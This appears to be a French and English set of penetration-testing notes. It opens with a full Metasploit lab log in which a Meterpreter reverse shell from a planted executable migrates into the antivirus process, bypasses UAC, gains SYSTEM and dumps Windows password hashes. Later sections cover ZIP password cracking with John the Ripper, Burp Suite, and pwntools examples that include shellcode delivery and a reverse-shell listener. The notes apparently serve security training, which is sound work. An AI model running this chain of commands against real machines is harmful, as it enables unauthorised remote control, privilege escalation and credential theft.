  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                         
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                         
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                         
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                          
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                           
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                            
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                             
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                              
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                
           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                  
             ;kOOOOOOOOOOOOOOOk:                                                                                    
               ,xOOOOOOOOOOOx,                                                                                      
                 .lOOOOOOOl.                                                                                        
                    ,dOd,                                                                                           
                      .                                                                                             

       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can upgrade a shell to a Meterpreter 
session on many platforms using sessions -u 
&lt;session_id&gt;                                                                                                        

msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp_allports 
payload =&gt; windows/meterpreter/reverse_tcp_allports
msf6 exploit(multi/handler) &gt; options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) &gt; exploit -j
msf6 exploit(multi/handler) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  Client-PC\Client @ CLIENT-PC  192.168.2.5:4444 -&gt; 192.168.2.10:49197  (192.16
                                                                   8.2.10)
                                                                   
meterpreter &gt; ps

Process List
============

 PID   PPID  Name               Arch  Session  User              Path
 ---   ----  ----               ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 280   4     smss.exe
 316   832   vmtoolsd.exe
 424   832   svchost.exe
 672   636   csrss.exe
 724   636   wininit.exe
 736   716   csrss.exe
 792   716   winlogon.exe
 808   3144  mmc.exe            x86   1
 832   724   services.exe
 844   724   lsass.exe
 852   724   lsm.exe
 952   832   svchost.exe
 1020  832   vmacthlp.exe
 1064  832   svchost.exe
 1076  3112  iexplore.exe       x86   1        Client-PC\Client  C:\Program Files\Internet Explorer\iexplore.exe
 1120  832   svchost.exe
 1228  832   svchost.exe
 1276  832   svchost.exe
 1412  832   svchost.exe
 1520  832   svchost.exe
 1620  832   spoolsv.exe
 1648  832   svchost.exe
 1764  832   avgwdsvcx.exe
 2028  832   VGAuthService.exe
 2168  792   taskmgr.exe        x86   1        Client-PC\Client  C:\Windows\system32\taskmgr.exe
 2352  952   WmiPrvSE.exe
 2476  832   taskhost.exe       x86   1        Client-PC\Client  C:\Windows\system32\taskhost.exe
 2484  832   dllhost.exe
 2692  832   sppsvc.exe
 2760  1076  iexplore.exe       x86   1        Client-PC\Client  C:\Program Files\Internet Explorer\iexplore.exe
 2868  832   msdtc.exe
 3088  1228  dwm.exe            x86   1        Client-PC\Client  C:\Windows\system32\Dwm.exe
 3112  3080  explorer.exe       x86   1        Client-PC\Client  C:\Windows\Explorer.EXE
 3144  952   dllhost.exe        x86   1
 3228  3112  reverse_all.exe    x86   1        Client-PC\Client  C:\Users\Client\Desktop\reverse_all.exe
 3232  3112  avgui.exe          x86   1        Client-PC\Client  C:\Program Files\AVG\Av\avgui.exe
 3296  3112  jusched.exe        x86   1        Client-PC\Client  C:\Program Files\Java\jre1.6.0\bin\jusched.exe
 3308  3112  vmtoolsd.exe       x86   1        Client-PC\Client  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 3500  3232  ctfmon.exe         x86   1        Client-PC\Client  C:\Windows\system32\ctfmon.exe
 3848  832   SearchIndexer.exe

meterpreter &gt; migrate 3232
[*] Migrating from 3228 to 3232...
[*] Migration completed successfully.

msf6 exploit(multi/handler) &gt; use exploit/windows/local/bypassuac
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac) &gt; options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.163.140  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac) &gt; set LHOST 192.168.2.5
LHOST =&gt; 192.168.2.5
msf6 exploit(windows/local/bypassuac) &gt; set payload windows/meterpreter/reverse_tcp_allports 
payload =&gt; windows/meterpreter/reverse_tcp_allports
msf6 exploit(windows/local/bypassuac) &gt; options
Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf6 exploit(windows/local/bypassuac) &gt; options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac) &gt; set SESSION 1
SESSION =&gt; 1
msf6 exploit(windows/local/bypassuac) &gt; run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Started reverse TCP handler on 192.168.2.5:4444 
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (175174 bytes) to 192.168.2.10
[*] Meterpreter session 2 opened (192.168.2.5:4444 -&gt; 192.168.2.10:49198 ) at 2022-06-23 16:00:14 +0200

meterpreter &gt; bg
[*] Backgrounding session 2...
msf6 exploit(windows/local/bypassuac) &gt; sessions 

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  Client-PC\Client @ CLIENT-PC  192.168.2.5:4444 -&gt; 192.168.2.10:49197  (192.16
                                                                   8.2.10)
  2         meterpreter x86/windows  Client-PC\Client @ CLIENT-PC  192.168.2.5:4444 -&gt; 192.168.2.10:49198  (192.16
                                                                   8.2.10)
msf6 exploit(windows/local/bypassuac) &gt; sessions 2
[*] Starting interaction with 2...

meterpreter &gt; getprivs 

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter &gt; getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; hashdump 
Admin:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Client:1000:aad3b435b51404eeaad3b435b51404ee:afc44ee7351d61d00698796da06b1ebf:::
Invit�:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></pre>
<h2 id="rentrer-dans-windows7-sans-executer-le-piège"><a class="header" href="#rentrer-dans-windows7-sans-executer-le-piège">Rentrer dans Windows7 sans executer le piège</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="password-cracking"><a class="header" href="#password-cracking">Password Cracking</a></h1>
<h2 id="crack-zip-files-password-using-john-the-ripper"><a class="header" href="#crack-zip-files-password-using-john-the-ripper">Crack ZIP Files Password Using John the Ripper</a></h2>
<pre><code class="language-shell">apt install zip
apt install unzip
apt install john

zip2john crack2.zip &gt; zip.hashes
john zip.hashes
# or
john --wordlist=wordlist.txt zip.hashes
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gdb"><a class="header" href="#gdb">GDB</a></h1>
<h2 id="install"><a class="header" href="#install">Install</a></h2>
<pre><code class="language-shell"># GDB client
$ sudo apt install gdb
# Server GDB
$ sudo apt install gdbserver
</code></pre>
<h2 id="plugins"><a class="header" href="#plugins">Plugins</a></h2>
<table><thead><tr><th>Plugins</th><th>Description</th></tr></thead><tbody>
<tr><td><a href="https://github.com/pwndbg/pwndbg">pwndbg</a></td><td>Dedie aux développeurs de logiciels de bas niveau, aux pirates informatiques, aux ingénieurs inverseurs et aux développeurs d'exploits.</td></tr>
</tbody></table>
<h2 id="scenario"><a class="header" href="#scenario">Scenario</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="burp-suite"><a class="header" href="#burp-suite">Burp Suite</a></h1>
<p>Burp Suite est un logiciel spécialisé pour les audits de sécurité web (pentests web). Il est développé par l’entreprise PortSwigger qui est une référence dans le monde de la sécurité web.</p>
<p>Burp Suite, appelé le plus souvent seulement Burp, est optimisé et pensé pour répondre aux besoins des pentesters professionnels et est d’ailleurs l’outil le plus utilisé dans son domaine. C’est un outil modulaire permettant de réaliser à la fois des tests manuels et automatisés qui vont aider le pentester à identifier efficacement des vulnérabilités sur les applications web.</p>
<p>Dans la suite de cet article, nous détaillerons les différentes fonctionnalités de Burp ainsi que les extensions clés. </p>
<p>Ref: I<a href="https://www.vaadata.com/blog/fr/introduction-burp-outil-dedie-securite-plateformes-web/">ntroduction à Burp, l’outil dédié à la sécurité des plateformes web</a></p>
<h2 id="foncions-principales"><a class="header" href="#foncions-principales">Foncions principales</a></h2>
<h3 id="le-proxy"><a class="header" href="#le-proxy">Le Proxy</a></h3>
<p>La fonctionnalité principale de Burp Suite est le Proxy. Le Proxy va permettre à Burp de jouer le rôle d’intermédiaire entre le client (navigateur web) et le serveur hébergeant l’application web.</p>
<p>En se plaçant entre ces deux composants, Burp va pouvoir intercepter l’intégralité des échanges et des requêtes réalisés entre le navigateur web et le serveur. Le pentester va donc pouvoir analyser en détail les requêtes, et s’il le veut, les modifier à la volée.</p>
<p>Pour modifier à la volée les requêtes, le Proxy permet d’intercepter les requêtes une par une et de laisser le choix au pentester de les laisser passer ou de les rejeter. S’il les laisse passer, il peut donc les modifier à la volée avant de les transmettre au serveur.</p>
<p>Sinon, le Proxy permet également de visualiser l’historique des requêtes en direct sans avoir à les transmettre manuellement au serveur. C’est d’ailleurs le mode le plus utilisé du Proxy.</p>
<h3 id="le-repeater"><a class="header" href="#le-repeater">Le Repeater</a></h3>
<p>Le Repeater est le module qui va permettre de rejouer des requêtes à volonté. Comme son nom l’indique, le pentester va pouvoir répéter des requêtes et les modifier à sa guise avant de les envoyer au serveur.</p>
<p>Il pourra ainsi analyser la réponse du serveur en fonction de ce qu’il a modifié. Le Repeater est souvent utilisé pour identifier manuellement des failles et les exploiter.</p>
<h3 id="lintruder-loutil-dintrusion"><a class="header" href="#lintruder-loutil-dintrusion">L’intruder, l’outil d’intrusion</a></h3>
<p>L’Intruder est un outil puissant qui va permettre d’automatiser l’envoi d’une requête comportant un payload personnalisé. Grâce à l’Intruder on va par exemple pouvoir automatiquement incrémenter une valeur et envoyer chaque incrémentation au serveur. L’Intruder va permettre au pentester d’automatiser des tâches fastidieuses ou impossibles à réaliser manuellement comme l’envoi de plusieurs milliers de requêtes. Les possibilités d’utilisation de l’Intruder sont quasi-infinies et permettent d’ajouter plusieurs payloads de même ou de différents types.</p>
<p>L’Intruder comporte un onglet « Positions » où le pentester pourra définir la position du payload dans la requête. Ensuite il pourra choisir le type de payload à injecter dans l’onglet « Payloads ».</p>
<h3 id="le-scanner-de-vulnérabilités"><a class="header" href="#le-scanner-de-vulnérabilités">Le scanner de vulnérabilités</a></h3>
<p>Le Scanner est une des fonctionnalités les plus utiles de l’édition « Professional » de Burp Suite. En effet, le Scanner va permettre d’effectuer automatiquement, des scans passifs sur l’intégralité des requêtes entre le client et le serveur et des scans actifs sur les requêtes choisies par le pentester.</p>
<p>Un scan passif est un type de scan où le trafic va être analysé et qui va remonter des vulnérabilités si des paternes sont reconnus par le scanner. Par exemple le Scanner de Burp va nous remonter des informations s’il aperçoit des adresses email dans les réponses serveurs. Lors des scans passifs, le Scanner ne va pas modifier les requêtes.</p>
<p>À l’inverse, un scan actif est un type de scan où le scanner va délibérément modifier la requête. Le Scanner va injecter des payloads malveillants dans une ou plusieurs requêtes choisies par le pentester et va analyser la réponse serveur. Si le scanner identifie un paterne qui est la conséquence directe du payload injecté, alors il nous remontera une vulnérabilité plus ou moins critique.</p>
<p>Le Scanner de Burp est donc un outil incontournable pour le pentester qui gagnera en temps et en efficacité.</p>
<p>Pour lancer un scan actif, il suffit d’envoyer la requête dans l’Intruder, spécifier la position du payload comme pour une utilisation classique de l’Intruder, faire un clique-droit sur la requête et appuyer sur « Do active scan ».</p>
<h3 id="collaborator"><a class="header" href="#collaborator">Collaborator</a></h3>
<p>Le Collaborator de Burp va permettre au pentester d’avoir une plateforme tierce sur Internet, accessible depuis n’importe où. Le Collaborator va servir notamment à exploiter des failles qui ne retournent aucune information dans la réponse serveur permettant de valider la faille.</p>
<p>On va parler de failles qui ne retournent aucunes erreurs, aucunes réponses anormales ou qui ne causent aucuns délais.</p>
<p>Par exemple, si la faille en question permet d’exécuter des commandes système sur le serveur mais que le résultat de la commande n’est pas visualisable dans la réponse serveur, on pourra utiliser le Collaborator pour exfiltrer le résultat de la commande.</p>
<h2 id="configuration-du-proxy"><a class="header" href="#configuration-du-proxy"><a href="https://www.youtube.com/watch?v=MH3F6qqcgyw">Configuration du <code>proxy</code></a></a></h2>
<p>Permet d'intercepter et de rejouer des requetes</p>
<h3 id="sur-le-browser"><a class="header" href="#sur-le-browser">Sur le browser</a></h3>
<ol>
<li>Installer le plugins <code>FoxyProxy</code></li>
<li>Plugin::<code>FoxyProxy</code> -&gt; Widget::<code>Options</code> -&gt; Ongle::<code>Proxies</code></li>
<li>Buttons::<code>Add</code></li>
</ol>
<table><thead><tr><th></th><th></th></tr></thead><tbody>
<tr><td><strong>Title</strong></td><td>BurpSuite</td></tr>
<tr><td><strong>Type</strong></td><td>HTTP</td></tr>
<tr><td><strong>Hostname</strong></td><td>127.0.0.1</td></tr>
<tr><td><strong>Port</strong></td><td>8080</td></tr>
</tbody></table>
<ol start="4">
<li>Plug::<code>FoxyProxy</code> -&gt; Widget::<code>BurpSuite</code></li>
</ol>
<p><strong>NOTE</strong> Si il y a TLS (HTTPS), allez a l'URL <a href="http://burp/cert">http://burp/cert</a> et en enregister le certificat de BurpSuite en tant que certificat d'Authorities, avec l'option <code>Trust this CA to identify websites</code></p>
<h3 id="sur-burpsuite"><a class="header" href="#sur-burpsuite">Sur <code>BurpSuite</code></a></h3>
<ol>
<li>Onglet::<code>Proxy</code> -&gt; button::<code>Intercept ON</code></li>
</ol>
<p>Pour rejouer =&gt; button::<code>Forward</code></p>
<div style="break-before: page; page-break-before: always;"></div><pre><code> ▄▄▄▄▄▄                        ▄▄▄▄▄▄▄▄                      ▄▄▄▄               
 ██▀▀▀▀█▄                      ▀▀▀██▀▀▀                      ▀▀██               
 ██    ██ ██      ██ ██▄████▄     ██      ▄████▄    ▄████▄     ██      ▄▄█████▄ 
 ██████▀  ▀█  ██  █▀ ██▀   ██     ██     ██▀  ▀██  ██▀  ▀██    ██      ██▄▄▄▄ ▀ 
 ██        ██▄██▄██  ██    ██     ██     ██    ██  ██    ██    ██       ▀▀▀▀██▄ 
 ██        ▀██  ██▀  ██    ██     ██     ▀██▄▄██▀  ▀██▄▄██▀    ██▄▄▄   █▄▄▄▄▄██ 
 ▀▀         ▀▀  ▀▀   ▀▀    ▀▀     ▀▀       ▀▀▀▀      ▀▀▀▀       ▀▀▀▀    ▀▀▀▀▀▀  
</code></pre>
<h2 id="whats-pwntools"><a class="header" href="#whats-pwntools">What's pwntools?</a></h2>
<ul>
<li>CTF framework and exploit development library</li>
<li>make exploit writing as simple as possible</li>
<li>https://pwntools.com &amp; https://docs.pwntools.com</li>
<li>grown from collection of tools by pwnies.dk and Samurai in 2012</li>
</ul>
<pre><code class="language-python">from pwn import *

context(arch = 'i386', os = 'linux')

r = remote('exploitme.example.com', 31337)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
r.interactive()
</code></pre>
<h2 id="usage-modes"><a class="header" href="#usage-modes">Usage modes</a></h2>
<table><thead><tr><th>pwn</th><th>pwnlib</th></tr></thead><tbody>
<tr><td>toolbox</td><td>library</td></tr>
<tr><td>changes terminal settings</td><td>does nothing special</td></tr>
<tr><td>parses special CLI arguments</td><td></td></tr>
</tbody></table>
<h2 id="basics-tubes"><a class="header" href="#basics-tubes">Basics: Tubes</a></h2>
<ul>
<li>
<p>Write once, run against everything</p>
</li>
<li>
<p>Common interface for interacting with data</p>
</li>
<li>
<p><code>process</code>, <code>remote</code>, <code>ssh</code>, <code>serialtube</code></p>
</li>
</ul>
<pre><code class="language-python">from pwn import *
io = process(['echo', 'hi'])
io.recvline()
</code></pre>
<pre><code class="language-shell">[x] Starting local process '/usr/bin/echo'
[+] Starting local process '/usr/bin/echo': pid 17261
[*] Process '/usr/bin/echo' stopped with exit code 0 (pid 17261)

b'hi\n'
</code></pre>
<h2 id="basics-receiving"><a class="header" href="#basics-receiving">Basics: Receiving</a></h2>
<pre><code class="language-python">io = process(['ls', '-l', '/'])
io.recvline()
</code></pre>
<pre><code class="language-shell">[x] Starting local process '/usr/bin/ls'
[+] Starting local process '/usr/bin/ls': pid 17262
[*] Process '/usr/bin/ls' stopped with exit code 0 (pid 17262)

b'total 876\n'
</code></pre>
<pre><code class="language-python">io.recvn(10)
</code></pre>
<pre><code class="language-shell">b'drwxr-xr-x'
</code></pre>
<pre><code class="language-python">io.recvuntil(b'bin')
</code></pre>
<pre><code class="language-shell">b'   3 root  root    4096 Mar 14  2023 Docker\nlrwxrwxrwx   1 root  root       7 Apr 23  2020 bin'
</code></pre>
<pre><code class="language-python">io.recvregex(br'\s+([0-9]+)', capture=True).group(1)
</code></pre>
<pre><code class="language-shell">b'2'
</code></pre>
<pre><code class="language-python"># io.recvline().decode()
io.recvlineS()
</code></pre>
<pre><code class="language-shell">' root  root    4096 Apr 23  2020 boot\n'
</code></pre>
<pre><code class="language-python">io.recvpred(lambda p: p.count(b'o') == 2)
</code></pre>
<pre><code>b'drwx------   2 roo'
</code></pre>
<pre><code class="language-python"># unpack(io.recvn(context.bytes))
hex(io.unpack())
</code></pre>
<pre><code class="language-shell">'0x72202074'
</code></pre>
<pre><code class="language-python"># u64(io.recvn(8))
hex(io.u64())
</code></pre>
<pre><code class="language-shell">'0x3420202020746f6f'
</code></pre>
<pre><code class="language-python">io.recvline_startswith(b'lrwxrwxrwx')
</code></pre>
<pre><code class="language-shell">b'lrwxrwxrwx   1 root  root       7 Apr 23  2020 lib -&gt; usr/lib'
</code></pre>
<h2 id="basics-sending"><a class="header" href="#basics-sending">Basics: Sending</a></h2>
<pre><code class="language-python">io = process('cat')
io.send(b'CTF0')
io.recv()
</code></pre>
<pre><code>[x] Starting local process '/usr/bin/cat'
[+] Starting local process '/usr/bin/cat': pid 17263


b'CTF0'
</code></pre>
<pre><code class="language-python">io.sendline(b'thing')
io.recv()
</code></pre>
<pre><code>b'thing\n'
</code></pre>
<pre><code class="language-python">io.newline = b'\r\n'
io.sendline(b'thong')
io.recv()
</code></pre>
<pre><code>b'thong\r\n'
</code></pre>
<h2 id="basics-sending-1"><a class="header" href="#basics-sending-1">Basics: Sending</a></h2>
<pre><code class="language-python">io.send(b'stuff serving as marker')
# recvuntil + send
io.sendafter(b'marker', b'behind marker') # sendlineafter
</code></pre>
<pre><code>b'stuff serving as marker'
</code></pre>
<pre><code class="language-python"># send + recvuntil
io.sendthen(b'back', b'echo back all of this please') # sendlinethen
</code></pre>
<pre><code>b'behind markerecho back'
</code></pre>
<pre><code class="language-python"># io.send(p64(0xdeadf00dcafebabe))
io.p64(0xdeadf00dcafebabe)
</code></pre>
<pre><code class="language-python"># io.send(flat({4: b'hi'}))
io.flat({4: b'hi'})
</code></pre>
<h1 id="remote-interaction"><a class="header" href="#remote-interaction">Remote interaction</a></h1>
<h2 id="connecting-somewhere"><a class="header" href="#connecting-somewhere">Connecting somewhere</a></h2>
<pre><code class="language-python"># TCP
tcp4 = remote('127.0.0.1', 1337)

# UDP
udp4 = remote('127.0.0.1', 1337, typ='udp')

# TLS
tls4 = remote('google.com', 443, ssl=True)

# IPv6
tcp6 = remote('google.com', 80, fam='ipv6')
</code></pre>
<h1 id="remote-interaction-1"><a class="header" href="#remote-interaction-1">Remote interaction</a></h1>
<h2 id="listen-servers"><a class="header" href="#listen-servers">Listen servers</a></h2>
<pre><code class="language-python"># Wait for single connection
client = listen(1337).wait_for_connection()

# Port forwarding
listen(1337).wait_for_connection().connect_both(remote('google.com', 80))

# Reverse shell
listen(1337).spawn_process('/bin/sh')

# Accept multiple connections
s = server(1337)
client = s.next_connection()

# With a prompt
cb = lambda io: io.sendline(b'Welcome!')
s = server(1337, callback=cb)
client = s.next_connection()
</code></pre>
<h1 id="custom-transport-layer"><a class="header" href="#custom-transport-layer">Custom transport layer</a></h1>
<ul>
<li>easy to implement own socket types on top of <code>tube</code></li>
<li>implement <code>recv_raw</code> and <code>send_raw</code></li>
</ul>
<pre><code class="language-python">t = tube()
t.recv_raw = lambda n: b'lots of data'
t.send_raw = lambda d: print(f'{d!r}')

print(t.recvuntil(b'of'))
t.sendline(b'hi')
</code></pre>
<pre><code>b'lots of'
b'hi\n'
</code></pre>
<h1 id="random-helpers"><a class="header" href="#random-helpers">Random helpers</a></h1>
<pre><code class="language-python"># Hex encode / decode
unhex(enhex(b'AAAA')) # bytes.fromhex(b'AAAA'.hex())
</code></pre>
<pre><code>b'AAAA'
</code></pre>
<pre><code class="language-python"># Base64 encode / decode
b64d(b64e(b'BBBB')) # import base64; base64.b64decode(base64.encode(b'BBBB'))
</code></pre>
<pre><code>b'BBBB'
</code></pre>
<pre><code class="language-python"># URL encoding
urlencode('?thing=asd') # urldecode as well
</code></pre>
<pre><code>'%3f%74%68%69%6e%67%3d%61%73%64'
</code></pre>
<pre><code class="language-python">write('./thing', b'important') # open('./thing', 'w').write(b'important')
read('./thing')                # open('./thing', 'rb').read()
</code></pre>
<pre><code>b'important'
</code></pre>
<h1 id="random-helpers-1"><a class="header" href="#random-helpers-1">Random helpers</a></h1>
<pre><code class="language-python"># Evaluate python expression safely
safeeval.expr('1 + 1')
</code></pre>
<pre><code>2
</code></pre>
<pre><code class="language-python"># Evaluate python expression using defined variables
safeeval.values('CTF + 20', {'CTF': 22})
</code></pre>
<pre><code>42
</code></pre>
<pre><code class="language-python"># Random string
randoms(16)
</code></pre>
<pre><code>'xfpmtktypmghasyi'
</code></pre>
<pre><code class="language-python"># XOR multiple things
xor(b'ABCDABCD', 5, b'XYZ')
</code></pre>
<pre><code>b'\x1c\x1e\x1c\x19\x1d\x1d\x1e\x18'
</code></pre>
<h1 id="context"><a class="header" href="#context">Context</a></h1>
<ul>
<li>thread-safe nesting context</li>
<li>controls default values of lots of modules</li>
</ul>
<p>adb, adb_host, adb_port, arch, aslr, binary, bits, buffer_size, bytes, cache_dir, cache_dir_base, cyclic_alphabet, cyclic_size, delete_corefiles, device, endian, gdbinit, kernel, log_console, log_file, log_level, newline, noptrace, os, proxy, quiet, randomize, rename_corefiles, signed, silent, terminal, timeout, verbose</p>
<pre><code class="language-python">context.arch = 'amd64'
context.log_level = 'error'
context.update(arch='amd64', os='linux')
    
# Infer from binary
context.clear()
context.binary = './chall'

with context.quiet:
    log.info('hi')
with context.local(log_level='info'):
    log.debug('ho')
</code></pre>
<pre><code>[*] '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    Enabled
    IBT:      Enabled
</code></pre>
<h1 id="context-1"><a class="header" href="#context-1">Context</a></h1>
<ul>
<li>most API accept context settings through kwargs</li>
</ul>
<pre><code class="language-python">print(context.os)
@LocalContext
def myfunc():
    print(context.os)
myfunc(os='windows')
print(context.os)
</code></pre>
<pre><code>linux
windows
linux
</code></pre>
<h1 id="exploit-template"><a class="header" href="#exploit-template">Exploit template</a></h1>
<ul>
<li>Generate exploit boilerplate code</li>
<li>Switch between remote and local target
<ul>
<li><code>./doit.py</code></li>
<li><code>./doit.py LOCAL</code></li>
</ul>
</li>
<li>Start a debug session
<ul>
<li><code>./doit.py LOCAL GDB</code></li>
</ul>
</li>
</ul>
<p><code>pwn template --host the.c.tf --port 1337 ./chall &gt; doit.py</code></p>
<ul>
<li><strong>new</strong>: omit <code>./chall</code> for auto-detection</li>
</ul>
<p><code>pwn template --host the.c.tf --port 1337 --libc libc.so.6 ./chall &gt; doit.py</code></p>
<h1 id="running-the-exploit"><a class="header" href="#running-the-exploit">Running the exploit</a></h1>
<ul>
<li>Control <code>context</code> through arguments:
<ul>
<li><code>./doit.py NOASLR LOG_LEVEL=error</code></li>
</ul>
</li>
<li>Control <code>context</code> through environment variables:
<ul>
<li><code>PWNLIB_NOASLR=1 PWNLIB_LOG_LEVEL=error ./exploit.py</code></li>
</ul>
</li>
<li>Access uppercase arguments through <code>args</code>
<ul>
<li><code>./doit.py TEAM=ctf0</code> -&gt; <code>args.TEAM == 'ctf0'</code></li>
</ul>
</li>
<li>Control logging
<ul>
<li><code>doit.py LOG_LEVEL=warn</code> -&gt; <code>context.log_level = 'warn'</code></li>
<li><code>doit.py DEBUG</code> -&gt; <code>context.log_level = 'debug'</code></li>
<li><code>doit.py SILENT</code> -&gt; <code>context.log_level = 'error'</code></li>
<li><code>doit.py STDERR</code> -&gt; sends logging to stderr instead of stdout</li>
<li><code>doit.py LOG_FILE=./log.txt</code> -&gt; write log to file</li>
</ul>
</li>
<li>Run with local system libc
<ul>
<li><code>./doit.py LOCAL LOCAL_LIBC</code></li>
</ul>
</li>
</ul>
<h1 id="elf"><a class="header" href="#elf">ELF</a></h1>
<pre><code class="language-python">exe = ELF('./chall')
</code></pre>
<pre><code class="language-python">hex(exe.sym.main) # exe.symbols['main']
</code></pre>
<pre><code>'0x401210'
</code></pre>
<pre><code class="language-python">exe.address = 0x99000000
hex(exe.sym.main)
</code></pre>
<pre><code>'0x99001210'
</code></pre>
<pre><code class="language-python">
io = exe.process()
io.close()
</code></pre>
<pre><code>[x] Starting local process '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall'
[+] Starting local process '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall': pid 17264
[*] Stopped process '/mnt/c/Users/Jannik/Downloads/ctfs/pwntools_tips/chall' (pid 17264)
</code></pre>
<h1 id="elf---debugging"><a class="header" href="#elf---debugging">ELF - Debugging</a></h1>
<pre><code class="language-python"># Start in debugger (using gdbserver)
io = exe.debug() # gdb.debug(exe.path)

# Attach to running process
io = exe.process()
gdb.attach(io)

# Attach to local listening process
io = remote('localhost', 1337)
gdb.attach(io)

# Interact with debugger
with exe.debug(api=True) as io:
    io.gdb.Breakpoint('puts', temporary=True)
